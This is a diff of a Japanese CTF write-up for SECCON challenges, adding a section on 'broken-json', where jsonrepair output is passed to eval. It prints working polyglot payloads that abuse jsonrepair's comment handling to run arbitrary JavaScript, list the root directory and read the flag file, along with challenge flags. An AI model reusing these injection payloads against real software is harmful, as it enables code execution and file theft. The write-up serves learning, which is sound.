@@ -10,7 +10,7 @@ tags:
   - Web
 ---
 
-# broken-challenge
+# [Web] broken-challenge
 XSSの問題だが、XSSを発生させるべきWebサーバーが存在せず、botだけが与えられた。そんな無茶な。
 
 conf.js:
@@ -323,8 +323,7 @@ with socketserver.TCPServer(("0.0.0.0", PORT), ExploitHandler) as httpd:
 `SECCON{congratz_you_hacked_the_planet_521ce0597cdcd1e3}`
 
 
-# framed-xss
-
+# [Web] framed-xss
 大会期間中には解けなかったが、upsolveしたのでwriteupを書く。
 
 iframe sandbox内に任意のhtmlを挿入することができるwebアプリ。これでどうにかしてXSSするという問題。
@@ -551,3 +550,39 @@ app.run("0.0.0.0", 50000)
 
 このサーバーを自分でホストし、そのURLを報告すると`/flag`にflagが飛んできた。
 `SECCON{New_fe4tur3,n3w_bypa55}`
+
+
+# [Jail] broken-json
+jsonrepairというパッケージに通した入力をそのままevalしている。flagのファイル名は推測困難なので、RCEが必要。
+
+```js
+#!/usr/local/bin/node
+import readline from "node:readline/promises";
+import { jsonrepair } from "jsonrepair";
+
+using rl = readline.createInterface({ input: process.stdin, output: process.stderr });
+await rl.question("jail> ").then(jsonrepair).then(eval).then(console.log);
+```
+
+例えば、このようなjsonとjsのpolyglotを与えるとjsとして解釈される。
+```
+jail> [{"x":1}]
+[ { x: 1 } ]
+```
+
+[jsonrepairのソースコード](https://github.com/josdejong/jsonrepair/blob/main/src/regular/jsonrepair.ts)を読むと、コメント周りの処理が不十分なことが分かった。LLMと壁打ちしつつガチャガチャしていたら、このような入力を与えた時に`console.log`が発火した。これで任意のjsを実行できた。
+```
+$ nc localhost 5000
+jail> [/",(console.log(1337),"ok"),"/]
+1337
+[ '/', 'ok', '/' ]
+```
+
+あとはjsonrepairがエラーを吐かないようにパズルをしてRCEに持ち込めば良い。
+```
+[/",(console.log(process.getBuiltinModule("node:fs").readdirSync(String.fromCharCode(47))), "ok"),"/]
+[/",(()=>{const fs=process.getBuiltinModule("node:fs");const r=String.fromCharCode(47);console.log(fs.readFileSync(r+"flag-235a7a7283c92a9c1f9a1e521e0e70f3.txt","utf8"));return "ok";})(),"/]
+```
+
+flagが得られた。
+`SECCON{Re:Jail_kara_Hajimeru_Break_Time}`
